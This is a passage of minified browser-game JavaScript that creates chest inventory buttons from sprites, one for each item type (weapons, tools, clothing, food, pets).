      this.chest_buttons[le.SEED].id = le.SEED;
      this.chest_buttons[le.WALL] = rs(68, 68, 0, sprite[Ie.CHEST_WALL], 3);
      this.chest_buttons[le.WALL].id = le.WALL;
      this.chest_buttons[le.SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_SPIKE], 3);
      this.chest_buttons[le.SPIKE].id = le.SPIKE;
      this.chest_buttons[le.PICK_WOOD] = rs(68, 68, 0, sprite[Ie.CHEST_PICK_WOOD], 3);
      this.chest_buttons[le.PICK_WOOD].id = le.PICK_WOOD;
      this.chest_buttons[le.COOKED_MEAT] = rs(68, 68, 0, sprite[Ie.CHEST_COOKED_MEAT], 3);
      this.chest_buttons[le.COOKED_MEAT].id = le.COOKED_MEAT;
      this.chest_buttons[le.MEAT] = rs(68, 68, 0, sprite[Ie.CHEST_MEAT], 3);
      this.chest_buttons[le.MEAT].id = le.MEAT;
      this.chest_buttons[le.BIG_FIRE] = rs(68, 68, 0, sprite[Ie.CHEST_BIG_FIRE], 3);
      this.chest_buttons[le.BIG_FIRE].id = le.BIG_FIRE;
      this.chest_buttons[le.BANDAGE] = rs(68, 68, 0, sprite[Ie.CHEST_BANDAGE], 3);
      this.chest_buttons[le.BANDAGE].id = le.BANDAGE;
      this.chest_buttons[le.CORD] = rs(68, 68, 0, sprite[Ie.CHEST_CORD], 3);
      this.chest_buttons[le.CORD].id = le.CORD;
      this.chest_buttons[le.STONE_WALL] = rs(68, 68, 0, sprite[Ie.CHEST_STONE_WALL], 3);
      this.chest_buttons[le.STONE_WALL].id = le.STONE_WALL;
      this.chest_buttons[le.GOLD_WALL] = rs(68, 68, 0, sprite[Ie.CHEST_GOLD_WALL], 3);
      this.chest_buttons[le.GOLD_WALL].id = le.GOLD_WALL;
      this.chest_buttons[le.DIAMOND_WALL] = rs(68, 68, 0, sprite[Ie.CHEST_DIAMOND_WALL], 3);
      this.chest_buttons[le.DIAMOND_WALL].id = le.DIAMOND_WALL;
      this.chest_buttons[le.WOOD_DOOR] = rs(68, 68, 0, sprite[Ie.CHEST_DOOR_WOOD_CLOSE], 3);
      this.chest_buttons[le.WOOD_DOOR].id = le.WOOD_DOOR;
      this.chest_buttons[le.CHEST] = rs(68, 68, 0, sprite[Ie.CHEST_CHEST], 3);
      this.chest_buttons[le.CHEST].id = le.CHEST;
      this.chest_buttons[le.STONE_SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_STONE_SPIKE], 3);
      this.chest_buttons[le.STONE_SPIKE].id = le.STONE_SPIKE;
      this.chest_buttons[le.GOLD_SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_GOLD_SPIKE], 3);
      this.chest_buttons[le.GOLD_SPIKE].id = le.GOLD_SPIKE;
      this.chest_buttons[le.DIAMOND_SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_DIAMOND_SPIKE], 3);
      this.chest_buttons[le.DIAMOND_SPIKE].id = le.DIAMOND_SPIKE;
      this.chest_buttons[le.FUR] = rs(68, 68, 0, sprite[Ie.CHEST_FUR], 3);
      this.chest_buttons[le.FUR].id = le.FUR;
      this.chest_buttons[le.FUR_BOAR] = rs(68, 68, 0, sprite[Ie.CHEST_FUR_BOAR], 3);
      this.chest_buttons[le.FUR_BOAR].id = le.FUR_BOAR;
      this.chest_buttons[le.FUR_WOLF] = rs(68, 68, 0, sprite[Ie.CHEST_FUR_WOLF], 3);
      this.chest_buttons[le.FUR_WOLF].id = le.FUR_WOLF;
      this.chest_buttons[le.PENGUIN_FEATHER] = rs(68, 68, 0, sprite[Ie.CHEST_PENGUIN_FEATHER], 3);
      this.chest_buttons[le.PENGUIN_FEATHER].id = le.PENGUIN_FEATHER;
      this.chest_buttons[le.HAWK_FEATHER] = rs(68, 68, 0, sprite[Ie.CHEST_HAWK_FEATHER], 3);
      this.chest_buttons[le.HAWK_FEATHER].id = le.HAWK_FEATHER;
      this.chest_buttons[le.VULTURE_FEATHER] = rs(68, 68, 0, sprite[Ie.CHEST_VULTURE_FEATHER], 3);
      this.chest_buttons[le.VULTURE_FEATHER].id = le.VULTURE_FEATHER;
      this.chest_buttons[le.EMERALD] = rs(68, 68, 0, sprite[Ie.CHEST_EMERALD], 3);
      this.chest_buttons[le.EMERALD].id = le.EMERALD;
      this.chest_buttons[le.EARMUFFS] = rs(68, 68, 0, sprite[Ie.CHEST_EARMUFFS], 3);
      this.chest_buttons[le.EARMUFFS].id = le.EARMUFFS;
      this.chest_buttons[le.STONE_DOOR] = rs(68, 68, 0, sprite[Ie.CHEST_DOOR_STONE_CLOSE], 3);
      this.chest_buttons[le.STONE_DOOR].id = le.STONE_DOOR;
      this.chest_buttons[le.GOLD_DOOR] = rs(68, 68, 0, sprite[Ie.CHEST_DOOR_GOLD_CLOSE], 3);
      this.chest_buttons[le.GOLD_DOOR].id = le.GOLD_DOOR;
      this.chest_buttons[le.DIAMOND_DOOR] = rs(68, 68, 0, sprite[Ie.CHEST_DOOR_DIAMOND_CLOSE], 3);
      this.chest_buttons[le.DIAMOND_DOOR].id = le.DIAMOND_DOOR;
      this.chest_buttons[le.COAT] = rs(68, 68, 0, sprite[Ie.CHEST_COAT], 3);
      this.chest_buttons[le.COAT].id = le.COAT;
      this.chest_buttons[le.WOOD_SPEAR] = rs(68, 68, 0, sprite[Ie.CHEST_WOOD_SPEAR], 3);
      this.chest_buttons[le.WOOD_SPEAR].id = le.WOOD_SPEAR;
      this.chest_buttons[le.SPEAR] = rs(68, 68, 0, sprite[Ie.CHEST_SPEAR], 3);
      this.chest_buttons[le.SPEAR].id = le.SPEAR;
      this.chest_buttons[le.GOLD_SPEAR] = rs(68, 68, 0, sprite[Ie.CHEST_GOLD_SPEAR], 3);
      this.chest_buttons[le.GOLD_SPEAR].id = le.GOLD_SPEAR;
      this.chest_buttons[le.DIAMOND_SPEAR] = rs(68, 68, 0, sprite[Ie.CHEST_DIAMOND_SPEAR], 3);
      this.chest_buttons[le.DIAMOND_SPEAR].id = le.DIAMOND_SPEAR;
      this.chest_buttons[le.DRAGON_SPEAR] = rs(68, 68, 0, sprite[Ie.CHEST_DRAGON_SPEAR], 3);
      this.chest_buttons[le.DRAGON_SPEAR].id = le.DRAGON_SPEAR;
      this.chest_buttons[le.FURNACE] = rs(68, 68, 0, sprite[Ie.CHEST_FURNACE], 3);
      this.chest_buttons[le.FURNACE].id = le.FURNACE;
      this.chest_buttons[le.EXPLORER_HAT] = rs(68, 68, 0, sprite[Ie.CHEST_EXPLORER_HAT], 3);
      this.chest_buttons[le.EXPLORER_HAT].id = le.EXPLORER_HAT;
      this.chest_buttons[le.PIRATE_HAT] = rs(68, 68, 0, sprite[Ie.CHEST_PIRATE_HAT], 3);
      this.chest_buttons[le.PIRATE_HAT].id = le.PIRATE_HAT;
      this.chest_buttons[le.FLOWER_HAT] = rs(68, 68, 0, sprite[Ie.CHEST_FLOWER_HAT], 3);
      this.chest_buttons[le.FLOWER_HAT].id = le.FLOWER_HAT;
      this.chest_buttons[le.FUR_HAT] = rs(68, 68, 0, sprite[Ie.CHEST_FUR_HAT], 3);
      this.chest_buttons[le.FUR_HAT].id = le.FUR_HAT;
      this.chest_buttons[le.TURBAN1] = rs(68, 68, 0, sprite[Ie.CHEST_TURBAN1], 3);
      this.chest_buttons[le.TURBAN1].id = le.TURBAN1;
      this.chest_buttons[le.TURBAN2] = rs(68, 68, 0, sprite[Ie.CHEST_TURBAN2], 3);
      this.chest_buttons[le.TURBAN2].id = le.TURBAN2;
      this.chest_buttons[le.WOOD_ARROW] = rs(68, 68, 0, sprite[Ie.CHEST_WOOD_ARROW], 3);
      this.chest_buttons[le.WOOD_ARROW].id = le.WOOD_ARROW;
      this.chest_buttons[le.WOOD_BOW] = rs(68, 68, 0, sprite[Ie.CHEST_WOOD_BOW], 3);
      this.chest_buttons[le.WOOD_BOW].id = le.WOOD_BOW;
      this.chest_buttons[le.WOOD_SHIELD] = rs(68, 68, 0, sprite[Ie.CHEST_WOOD_SHIELD], 3);
      this.chest_buttons[le.WOOD_SHIELD].id = le.WOOD_SHIELD;
      this.chest_buttons[le.STONE_ARROW] = rs(68, 68, 0, sprite[Ie.CHEST_STONE_ARROW], 3);
      this.chest_buttons[le.STONE_ARROW].id = le.STONE_ARROW;
      this.chest_buttons[le.STONE_BOW] = rs(68, 68, 0, sprite[Ie.CHEST_STONE_BOW], 3);
      this.chest_buttons[le.STONE_BOW].id = le.STONE_BOW;
      this.chest_buttons[le.STONE_SHIELD] = rs(68, 68, 0, sprite[Ie.CHEST_STONE_SHIELD], 3);
      this.chest_buttons[le.STONE_SHIELD].id = le.STONE_SHIELD;
      this.chest_buttons[le.GOLD_ARROW] = rs(68, 68, 0, sprite[Ie.CHEST_GOLD_ARROW], 3);
      this.chest_buttons[le.GOLD_ARROW].id = le.GOLD_ARROW;
      this.chest_buttons[le.GOLD_BOW] = rs(68, 68, 0, sprite[Ie.CHEST_GOLD_BOW], 3);
      this.chest_buttons[le.GOLD_BOW].id = le.GOLD_BOW;
      this.chest_buttons[le.GOLD_SHIELD] = rs(68, 68, 0, sprite[Ie.CHEST_GOLD_SHIELD], 3);
      this.chest_buttons[le.GOLD_SHIELD].id = le.GOLD_SHIELD;
      this.chest_buttons[le.DIAMOND_ARROW] = rs(68, 68, 0, sprite[Ie.CHEST_DIAMOND_ARROW], 3);
      this.chest_buttons[le.DIAMOND_ARROW].id = le.DIAMOND_ARROW;
      this.chest_buttons[le.DIAMOND_BOW] = rs(68, 68, 0, sprite[Ie.CHEST_DIAMOND_BOW], 3);
      this.chest_buttons[le.DIAMOND_BOW].id = le.DIAMOND_BOW;
      this.chest_buttons[le.DIAMOND_SHIELD] = rs(68, 68, 0, sprite[Ie.CHEST_DIAMOND_SHIELD], 3);
      this.chest_buttons[le.DIAMOND_SHIELD].id = le.DIAMOND_SHIELD;
      this.chest_buttons[le.AMETHYST_ARROW] = rs(68, 68, 0, sprite[Ie.CHEST_AMETHYST_ARROW], 3);
      this.chest_buttons[le.AMETHYST_ARROW].id = le.AMETHYST_ARROW;
      this.chest_buttons[le.AMETHYST_BOW] = rs(68, 68, 0, sprite[Ie.CHEST_AMETHYST_BOW], 3);
      this.chest_buttons[le.AMETHYST_BOW].id = le.AMETHYST_BOW;
      this.chest_buttons[le.AMETHYST_SHIELD] = rs(68, 68, 0, sprite[Ie.CHEST_AMETHYST_SHIELD], 3);
      this.chest_buttons[le.AMETHYST_SHIELD].id = le.AMETHYST_SHIELD;
      this.chest_buttons[le.REIDITE_ARROW] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE_ARROW], 3);
      this.chest_buttons[le.REIDITE_ARROW].id = le.REIDITE_ARROW;
      this.chest_buttons[le.REIDITE_BOW] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE_BOW], 3);
      this.chest_buttons[le.REIDITE_BOW].id = le.REIDITE_BOW;
      this.chest_buttons[le.REIDITE_SHIELD] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE_SHIELD], 3);
      this.chest_buttons[le.REIDITE_SHIELD].id = le.REIDITE_SHIELD;
      this.chest_buttons[le.DRAGON_ARROW] = rs(68, 68, 0, sprite[Ie.CHEST_DRAGON_ARROW], 3);
      this.chest_buttons[le.DRAGON_ARROW].id = le.DRAGON_ARROW;
      this.chest_buttons[le.DRAGON_BOW] = rs(68, 68, 0, sprite[Ie.CHEST_DRAGON_BOW], 3);
      this.chest_buttons[le.DRAGON_BOW].id = le.DRAGON_BOW;
      this.chest_buttons[le.WOOD_HELMET] = rs(68, 68, 0, sprite[Ie.CHEST_WOOD_HELMET], 3);
      this.chest_buttons[le.WOOD_HELMET].id = le.WOOD_HELMET;
      this.chest_buttons[le.STONE_HELMET] = rs(68, 68, 0, sprite[Ie.CHEST_STONE_HELMET], 3);
      this.chest_buttons[le.STONE_HELMET].id = le.STONE_HELMET;
      this.chest_buttons[le.GOLD_HELMET] = rs(68, 68, 0, sprite[Ie.CHEST_GOLD_HELMET], 3);
      this.chest_buttons[le.GOLD_HELMET].id = le.GOLD_HELMET;
      this.chest_buttons[le.DIAMOND_HELMET] = rs(68, 68, 0, sprite[Ie.CHEST_DIAMOND_HELMET], 3);
      this.chest_buttons[le.DIAMOND_HELMET].id = le.DIAMOND_HELMET;
      this.chest_buttons[le.BOOK] = rs(68, 68, 0, sprite[Ie.CHEST_BOOK], 3);
      this.chest_buttons[le.BOOK].id = le.BOOK;
      this.chest_buttons[le.PAPER] = rs(68, 68, 0, sprite[Ie.CHEST_PAPER], 3);
      this.chest_buttons[le.PAPER].id = le.PAPER;
      this.chest_buttons[le.BAG] = rs(68, 68, 0, sprite[Ie.CHEST_BAG], 3);
      this.chest_buttons[le.BAG].id = le.BAG;
      this.chest_buttons[le.AMETHYST] = rs(68, 68, 0, sprite[Ie.CHEST_AMETHYST], 3);
      this.chest_buttons[le.AMETHYST].id = le.AMETHYST;
      this.chest_buttons[le.SWORD_AMETHYST] = rs(68, 68, 0, sprite[Ie.CHEST_SWORD_AMETHYST], 3);
      this.chest_buttons[le.SWORD_AMETHYST].id = le.SWORD_AMETHYST;
      this.chest_buttons[le.PIRATE_SWORD] = rs(68, 68, 0, sprite[Ie.CHEST_PIRATE_SWORD], 3);
      this.chest_buttons[le.PIRATE_SWORD].id = le.PIRATE_SWORD;
      this.chest_buttons[le.PICK_AMETHYST] = rs(68, 68, 0, sprite[Ie.CHEST_PICK_AMETHYST], 3);
      this.chest_buttons[le.PICK_AMETHYST].id = le.PICK_AMETHYST;
      this.chest_buttons[le.PICK_REIDITE] = rs(68, 68, 0, sprite[Ie.CHEST_PICK_REIDITE], 3);
      this.chest_buttons[le.PICK_REIDITE].id = le.PICK_REIDITE;
      this.chest_buttons[le.AMETHYST_SPEAR] = rs(68, 68, 0, sprite[Ie.CHEST_AMETHYST_SPEAR], 3);
      this.chest_buttons[le.AMETHYST_SPEAR].id = le.AMETHYST_SPEAR;
      this.chest_buttons[le.HAMMER] = rs(68, 68, 0, sprite[Ie.CHEST_HAMMER], 3);
      this.chest_buttons[le.HAMMER].id = le.HAMMER;
      this.chest_buttons[le.HAMMER_GOLD] = rs(68, 68, 0, sprite[Ie.CHEST_HAMMER_GOLD], 3);
      this.chest_buttons[le.HAMMER_GOLD].id = le.HAMMER_GOLD;
      this.chest_buttons[le.HAMMER_DIAMOND] = rs(68, 68, 0, sprite[Ie.CHEST_HAMMER_DIAMOND], 3);
      this.chest_buttons[le.HAMMER_DIAMOND].id = le.HAMMER_DIAMOND;
      this.chest_buttons[le.HAMMER_AMETHYST] = rs(68, 68, 0, sprite[Ie.CHEST_HAMMER_AMETHYST], 3);
      this.chest_buttons[le.HAMMER_AMETHYST].id = le.HAMMER_AMETHYST;
      this.chest_buttons[le.HAMMER_REIDITE] = rs(68, 68, 0, sprite[Ie.CHEST_HAMMER_REIDITE], 3);
      this.chest_buttons[le.HAMMER_REIDITE].id = le.HAMMER_REIDITE;
      this.chest_buttons[le.AMETHYST_WALL] = rs(68, 68, 0, sprite[Ie.CHEST_AMETHYST_WALL], 3);
      this.chest_buttons[le.AMETHYST_WALL].id = le.AMETHYST_WALL;
      this.chest_buttons[le.AMETHYST_SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_AMETHYST_SPIKE], 3);
      this.chest_buttons[le.AMETHYST_SPIKE].id = le.AMETHYST_SPIKE;
      this.chest_buttons[le.AMETHYST_DOOR] = rs(68, 68, 0, sprite[Ie.CHEST_DOOR_AMETHYST_CLOSE], 3);
      this.chest_buttons[le.AMETHYST_DOOR].id = le.AMETHYST_DOOR;
      this.chest_buttons[le.CAP_SCARF] = rs(68, 68, 0, sprite[Ie.CHEST_CAP_SCARF], 3);
      this.chest_buttons[le.CAP_SCARF].id = le.CAP_SCARF;
      this.chest_buttons[le.FUR_WINTER] = rs(68, 68, 0, sprite[Ie.CHEST_FUR_WINTER], 3);
      this.chest_buttons[le.FUR_WINTER].id = le.FUR_WINTER;
      this.chest_buttons[le.FUR_MAMMOTH] = rs(68, 68, 0, sprite[Ie.CHEST_FUR_MAMMOTH], 3);
      this.chest_buttons[le.FUR_MAMMOTH].id = le.FUR_MAMMOTH;
      this.chest_buttons[le.BLUE_CORD] = rs(68, 68, 0, sprite[Ie.CHEST_BLUE_CORD], 3);
      this.chest_buttons[le.BLUE_CORD].id = le.BLUE_CORD;
      this.chest_buttons[le.LOCK] = rs(68, 68, 0, sprite[Ie.CHEST_LOCK], 3);
      this.chest_buttons[le.LOCK].id = le.LOCK;
      this.chest_buttons[le.DRAGON_HEART] = rs(68, 68, 0, sprite[Ie.CHEST_DRAGON_HEART], 3);
      this.chest_buttons[le.DRAGON_HEART].id = le.DRAGON_HEART;
      this.chest_buttons[le.LAVA_HEART] = rs(68, 68, 0, sprite[Ie.CHEST_LAVA_HEART], 3);
      this.chest_buttons[le.LAVA_HEART].id = le.LAVA_HEART;
      this.chest_buttons[le.RESURRECTION] = rs(68, 68, 0, sprite[Ie.CHEST_RESURRECTION], 3);
      this.chest_buttons[le.RESURRECTION].id = le.RESURRECTION;
      this.chest_buttons[le.LOCKPICK] = rs(68, 68, 0, sprite[Ie.CHEST_LOCKPICK], 3);
      this.chest_buttons[le.LOCKPICK].id = le.LOCKPICK;
      this.chest_buttons[le.TOTEM] = rs(68, 68, 0, sprite[Ie.CHEST_TOTEM], 3);
      this.chest_buttons[le.TOTEM].id = le.TOTEM;
      this.chest_buttons[le.AMETHYST_HELMET] = rs(68, 68, 0, sprite[Ie.CHEST_AMETHYST_HELMET], 3);
      this.chest_buttons[le.AMETHYST_HELMET].id = le.AMETHYST_HELMET;
      this.chest_buttons[le.SUPER_HAMMER] = rs(68, 68, 0, sprite[Ie.CHEST_SUPER_HAMMER], 3);
      this.chest_buttons[le.SUPER_HAMMER].id = le.SUPER_HAMMER;
      this.chest_buttons[le.BRIDGE] = rs(68, 68, 0, sprite[Ie.CHEST_BRIDGE], 3);
      this.chest_buttons[le.BRIDGE].id = le.BRIDGE;
      this.chest_buttons[le.WOOD_TOWER] = rs(68, 68, 0, sprite[Ie.CHEST_WOOD_TOWER], 3);
      this.chest_buttons[le.WOOD_TOWER].id = le.WOOD_TOWER;
      this.chest_buttons[le.BOAT] = rs(68, 68, 0, sprite[Ie.CHEST_BOAT], 3);
      this.chest_buttons[le.BOAT].id = le.BOAT;
      this.chest_buttons[le.SLED] = rs(68, 68, 0, sprite[Ie.CHEST_SLED], 3);
      this.chest_buttons[le.SLED].id = le.SLED;
      this.chest_buttons[le.PLANE] = rs(68, 68, 0, sprite[Ie.CHEST_PLANE], 3);
      this.chest_buttons[le.PLANE].id = le.PLANE;
      this.chest_buttons[le.SADDLE] = rs(68, 68, 0, sprite[Ie.CHEST_SADDLE], 3);
      this.chest_buttons[le.SADDLE].id = le.SADDLE;
      this.chest_buttons[le.MOUNT_BOAR] = rs(68, 68, 0, sprite[Ie.CHEST_MOUNT_BOAR], 3);
      this.chest_buttons[le.MOUNT_BOAR].id = le.MOUNT_BOAR;
      this.chest_buttons[le.BABY_DRAGON] = rs(68, 68, 0, sprite[Ie.CHEST_BABY_DRAGON], 3);
      this.chest_buttons[le.BABY_DRAGON].id = le.BABY_DRAGON;
      this.chest_buttons[le.BABY_MAMMOTH] = rs(68, 68, 0, sprite[Ie.CHEST_BABY_MAMMOTH], 3);
      this.chest_buttons[le.BABY_MAMMOTH].id = le.BABY_MAMMOTH;
      this.chest_buttons[le.BABY_LAVA] = rs(68, 68, 0, sprite[Ie.CHEST_BABY_LAVA], 3);
      this.chest_buttons[le.BABY_LAVA].id = le.BABY_LAVA;
      this.chest_buttons[le.HAWK] = rs(68, 68, 0, sprite[Ie.CHEST_HAWK], 3);
      this.chest_buttons[le.HAWK].id = le.HAWK;
      this.chest_buttons[le.CRAB_BOSS] = rs(68, 68, 0, sprite[Ie.CHEST_CRAB_BOSS], 3);
      this.chest_buttons[le.CRAB_BOSS].id = le.CRAB_BOSS;
      this.chest_buttons[le.SAND] = rs(68, 68, 0, sprite[Ie.CHEST_SAND], 3);
      this.chest_buttons[le.SAND].id = le.SAND;
      this.chest_buttons[le.BOTTLE_FULL] = rs(68, 68, 0, sprite[Ie.CHEST_BOTTLE_FULL], 3);
      this.chest_buttons[le.BOTTLE_FULL].id = le.BOTTLE_FULL;
      this.chest_buttons[le.BOTTLE_EMPTY] = rs(68, 68, 0, sprite[Ie.CHEST_BOTTLE_EMPTY], 3);
      this.chest_buttons[le.BOTTLE_EMPTY].id = le.BOTTLE_EMPTY;
      this.chest_buttons[le.SHOVEL] = rs(68, 68, 0, sprite[Ie.CHEST_SHOVEL], 3);
      this.chest_buttons[le.SHOVEL].id = le.SHOVEL;
      this.chest_buttons[le.SHOVEL_GOLD] = rs(68, 68, 0, sprite[Ie.CHEST_SHOVEL_GOLD], 3);
      this.chest_buttons[le.SHOVEL_GOLD].id = le.SHOVEL_GOLD;
      this.chest_buttons[le.SHOVEL_DIAMOND] = rs(68, 68, 0, sprite[Ie.CHEST_SHOVEL_DIAMOND], 3);
      this.chest_buttons[le.SHOVEL_DIAMOND].id = le.SHOVEL_DIAMOND;
      this.chest_buttons[le.SHOVEL_AMETHYST] = rs(68, 68, 0, sprite[Ie.CHEST_SHOVEL_AMETHYST], 3);
      this.chest_buttons[le.SHOVEL_AMETHYST].id = le.SHOVEL_AMETHYST;
      this.chest_buttons[le.SPANNER] = rs(68, 68, 0, sprite[Ie.CHEST_SPANNER], 3);
      this.chest_buttons[le.SPANNER].id = le.SPANNER;
      this.chest_buttons[le.KRAKEN_SKIN] = rs(68, 68, 0, sprite[Ie.CHEST_KRAKEN_SKIN], 3);
      this.chest_buttons[le.KRAKEN_SKIN].id = le.KRAKEN_SKIN;
      this.chest_buttons[le.WATERING_CAN] = rs(68, 68, 0, sprite[Ie.CHEST_WATERING_CAN], 3);
      this.chest_buttons[le.WATERING_CAN].id = le.WATERING_CAN;
      this.chest_buttons[le.FLOUR] = rs(68, 68, 0, sprite[Ie.CHEST_FLOUR], 3);
      this.chest_buttons[le.FLOUR].id = le.FLOUR;
      this.chest_buttons[le.WHEAT_SEED] = rs(68, 68, 0, sprite[Ie.CHEST_WHEAT_SEED], 3);
      this.chest_buttons[le.WHEAT_SEED].id = le.WHEAT_SEED;
      this.chest_buttons[le.COOKIE] = rs(68, 68, 0, sprite[Ie.CHEST_COOKIE], 3);
      this.chest_buttons[le.COOKIE].id = le.COOKIE;
      this.chest_buttons[le.WILD_WHEAT] = rs(68, 68, 0, sprite[Ie.CHEST_WILD_WHEAT], 3);
      this.chest_buttons[le.WILD_WHEAT].id = le.WILD_WHEAT;
      this.chest_buttons[le.WINDMILL] = rs(68, 68, 0, sprite[Ie.CHEST_WINDMILL], 3);
      this.chest_buttons[le.WINDMILL].id = le.WINDMILL;
      this.chest_buttons[le.SUPER_DIVING_SUIT] = rs(68, 68, 0, sprite[Ie.CHEST_SUPER_DIVING_SUIT], 3);
      this.chest_buttons[le.SUPER_DIVING_SUIT].id = le.SUPER_DIVING_SUIT;
      this.chest_buttons[le.DIVING_MASK] = rs(68, 68, 0, sprite[Ie.CHEST_DIVING_MASK], 3);
      this.chest_buttons[le.DIVING_MASK].id = le.DIVING_MASK;
      this.chest_buttons[le.WATERING_CAN_FULL] = rs(68, 68, 0, sprite[Ie.CHEST_WATERING_CAN_FULL], 3);
      this.chest_buttons[le.WATERING_CAN_FULL].id = le.WATERING_CAN_FULL;
      this.chest_buttons[le.CAKE] = rs(68, 68, 0, sprite[Ie.CHEST_CAKE], 3);
      this.chest_buttons[le.CAKE].id = le.CAKE;
      this.chest_buttons[le.BREAD] = rs(68, 68, 0, sprite[Ie.CHEST_BREAD], 3);
      this.chest_buttons[le.BREAD].id = le.BREAD;
      this.chest_buttons[le.FOODFISH] = rs(68, 68, 0, sprite[Ie.CHEST_FOODFISH], 3);
      this.chest_buttons[le.FOODFISH].id = le.FOODFISH;
      this.chest_buttons[le.FOODFISH_COOKED] = rs(68, 68, 0, sprite[Ie.CHEST_FOODFISH_COOKED], 3);
      this.chest_buttons[le.FOODFISH_COOKED].id = le.FOODFISH_COOKED;
      this.chest_buttons[le.SCALES] = rs(68, 68, 0, sprite[Ie.CHEST_SCALES], 3);
      this.chest_buttons[le.SCALES].id = le.SCALES;
      this.chest_buttons[le.GROUND] = rs(68, 68, 0, sprite[Ie.CHEST_GROUND], 3);
      this.chest_buttons[le.GROUND].id = le.GROUND;
      this.chest_buttons[le.PLOT] = rs(68, 68, 0, sprite[Ie.CHEST_PLOT], 3);
      this.chest_buttons[le.PLOT].id = le.PLOT;
      this.chest_buttons[le.ICE] = rs(68, 68, 0, sprite[Ie.CHEST_ICE], 3);
      this.chest_buttons[le.ICE].id = le.ICE;
      this.chest_buttons[le.BREAD_OVEN] = rs(68, 68, 0, sprite[Ie.CHEST_BREAD_OVEN], 3);
      this.chest_buttons[le.BREAD_OVEN].id = le.BREAD_OVEN;
      this.chest_buttons[le.SANDWICH] = rs(68, 68, 0, sprite[Ie.CHEST_SANDWICH], 3);
      this.chest_buttons[le.SANDWICH].id = le.SANDWICH;
      this.chest_buttons[le.DRAGON_HELMET] = rs(68, 68, 0, sprite[Ie.CHEST_DRAGON_HELMET], 3);
      this.chest_buttons[le.DRAGON_HELMET].id = le.DRAGON_HELMET;
      this.chest_buttons[le.DRAGON_SWORD] = rs(68, 68, 0, sprite[Ie.CHEST_DRAGON_SWORD], 3);
      this.chest_buttons[le.DRAGON_SWORD].id = le.DRAGON_SWORD;
      this.chest_buttons[le.DRAGON_ORB] = rs(68, 68, 0, sprite[Ie.CHEST_DRAGON_ORB], 3);
      this.chest_buttons[le.DRAGON_ORB].id = le.DRAGON_ORB;
      this.chest_buttons[le.DRAGON_CUBE] = rs(68, 68, 0, sprite[Ie.CHEST_DRAGON_CUBE], 3);
      this.chest_buttons[le.DRAGON_CUBE].id = le.DRAGON_CUBE;
      this.chest_buttons[le.LAVA_ORB] = rs(68, 68, 0, sprite[Ie.CHEST_LAVA_ORB], 3);
      this.chest_buttons[le.LAVA_ORB].id = le.LAVA_ORB;
      this.chest_buttons[le.LAVA_CUBE] = rs(68, 68, 0, sprite[Ie.CHEST_LAVA_CUBE], 3);
      this.chest_buttons[le.LAVA_CUBE].id = le.LAVA_CUBE;
      this.chest_buttons[le.CROWN_GREEN] = rs(68, 68, 0, sprite[Ie.CHEST_CROWN_GREEN], 3);
      this.chest_buttons[le.CROWN_GREEN].id = le.CROWN_GREEN;
      this.chest_buttons[le.GEMME_GREEN] = rs(68, 68, 0, sprite[Ie.CHEST_GEMME_GREEN], 3);
      this.chest_buttons[le.GEMME_GREEN].id = le.GEMME_GREEN;
      this.chest_buttons[le.GEMME_ORANGE] = rs(68, 68, 0, sprite[Ie.CHEST_GEMME_ORANGE], 3);
      this.chest_buttons[le.GEMME_ORANGE].id = le.GEMME_ORANGE;
      this.chest_buttons[le.CROWN_ORANGE] = rs(68, 68, 0, sprite[Ie.CHEST_CROWN_ORANGE], 3);
      this.chest_buttons[le.CROWN_ORANGE].id = le.CROWN_ORANGE;
      this.chest_buttons[le.GEMME_BLUE] = rs(68, 68, 0, sprite[Ie.CHEST_GEMME_BLUE], 3);
      this.chest_buttons[le.GEMME_BLUE].id = le.GEMME_BLUE;
      this.chest_buttons[le.CROWN_BLUE] = rs(68, 68, 0, sprite[Ie.CHEST_CROWN_BLUE], 3);
      this.chest_buttons[le.CROWN_BLUE].id = le.CROWN_BLUE;
      this.chest_buttons[le.HOOD] = rs(68, 68, 0, sprite[Ie.CHEST_HOOD], 3);
      this.chest_buttons[le.HOOD].id = le.HOOD;
      this.chest_buttons[le.PEASANT] = rs(68, 68, 0, sprite[Ie.CHEST_PEASANT], 3);
      this.chest_buttons[le.PEASANT].id = le.PEASANT;
      this.chest_buttons[le.SPECIAL_FUR] = rs(68, 68, 0, sprite[Ie.CHEST_SPECIAL_FUR], 3);
      this.chest_buttons[le.SPECIAL_FUR].id = le.SPECIAL_FUR;
      this.chest_buttons[le.SPECIAL_FUR_2] = rs(68, 68, 0, sprite[Ie.CHEST_SPECIAL_FUR_2], 3);
      this.chest_buttons[le.SPECIAL_FUR_2].id = le.SPECIAL_FUR_2;
      this.chest_buttons[le.WINTER_PEASANT] = rs(68, 68, 0, sprite[Ie.CHEST_WINTER_PEASANT], 3);
      this.chest_buttons[le.WINTER_PEASANT].id = le.WINTER_PEASANT;
      this.chest_buttons[le.WINTER_HOOD] = rs(68, 68, 0, sprite[Ie.CHEST_WINTER_HOOD], 3);
      this.chest_buttons[le.WINTER_HOOD].id = le.WINTER_HOOD;
      this.chest_buttons[le.BUCKET_FULL] = rs(68, 68, 0, sprite[Ie.CHEST_BUCKET_FULL], 3);
      this.chest_buttons[le.BUCKET_FULL].id = le.BUCKET_FULL;
      this.chest_buttons[le.BUCKET_EMPTY] = rs(68, 68, 0, sprite[Ie.CHEST_BUCKET_EMPTY], 3);
      this.chest_buttons[le.BUCKET_EMPTY].id = le.BUCKET_EMPTY;
      this.chest_buttons[le.WELL] = rs(68, 68, 0, sprite[Ie.CHEST_WELL], 3);
      this.chest_buttons[le.WELL].id = le.WELL;
      this.chest_buttons[le.SIGN] = rs(68, 68, 0, sprite[Ie.CHEST_SIGN], 3);
      this.chest_buttons[le.SIGN].id = le.SIGN;
      this.chest_buttons[le.PUMPKIN_SEED] = rs(68, 68, 0, sprite[Ie.CHEST_PUMPKIN_SEED], 3);
      this.chest_buttons[le.PUMPKIN_SEED].id = le.PUMPKIN_SEED;
      this.chest_buttons[le.PUMPKIN] = rs(68, 68, 0, sprite[Ie.CHEST_PUMPKIN], 3);
      this.chest_buttons[le.PUMPKIN].id = le.PUMPKIN;
